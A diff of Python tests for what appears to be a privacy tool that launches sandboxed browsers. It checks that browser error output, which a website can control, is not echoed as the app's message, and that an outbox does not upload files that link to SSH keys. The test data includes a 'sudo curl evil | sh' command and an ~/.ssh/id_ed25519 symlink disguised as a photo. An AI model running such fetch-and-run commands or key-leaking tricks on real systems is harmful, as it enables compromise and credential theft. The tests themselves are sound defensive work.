@@ -515,12 +515,18 @@ def test_a_failed_start_says_why(host, monkeypatch):
     # so the mark stays: a browser taken over could stop itself with an error to shed it
     assert B.sandboxed_before(host, b)
     (B.private_dir(host, b) / "sandboxed").unlink()
-    # one that fails later is said once, by the status
+    # one that fails later is said once, by the status, by its exit status alone: once the browser has run, what is in
+    # the log could be a website's (the sandbox can reach the log's descriptor), which the page would show as the app's
     p = Proc()
-    B.start(host, b, spawn=lambda argv, **kw: os.write(kw["stderr"], b"tor didn't start: [err] no route\n") and p)
+    B.start(host, b, spawn=lambda argv, **kw: os.write(kw["stderr"], b"run: sudo curl evil | sh\n") and p)
     assert B.launch_problem(b) is None
     p.rc = 3
-    assert "tor didn't start: [err] no route" in B.launch_problem(b) and B.launch_problem(b) is None
+    problem = B.launch_problem(b)
+    assert problem.endswith("it stopped (exit status 3)") and "evil" not in problem and B.launch_problem(b) is None
+    p.rc = None
+    B.start(host, b, spawn=lambda argv, **kw: p)
+    p.rc = 137
+    assert "out of memory" in B.launch_problem(b)
 
 
 def test_the_session_starts_afresh_and_keeps_no_recent_files(host, monkeypatch):
@@ -677,7 +683,7 @@ def outbox_mat2(host, seen=None):
     host.runner.handlers["mat2"] = mat2
 
 
-def test_the_tempoutbox_cleans_into_to_upload_and_keeps_the_originals(host):
+def test_the_tempoutbox_cleans_into_to_upload_and_keeps_the_originals(host, request):
     installed_tor(host)
     T.prepare(host, "tor-browser")
     b = B.BROWSERS["tor"]
@@ -696,6 +702,9 @@ def test_the_tempoutbox_cleans_into_to_upload_and_keeps_the_originals(host):
     os.symlink(host.home / ".ssh/id_ed25519", box / "key.jpg")
     old(box / "key.jpg")
     T.forget_recent()
+    from daprivacyscanner.tools import owner
+    assert owner.claim(host, "TempBrowser", host.home / "TempBrowser")      # this copy's (only the owner empties it)
+    request.addfinalizer(lambda: owner.release(host, "TempBrowser"))
     B.run_outboxes(host)
     up = T.uploads_dir(host, "tor-browser")
     assert sorted(x.name for x in up.iterdir()) == ["photo.jpg"] and (up / "photo.jpg").read_bytes() == b"jpeg"
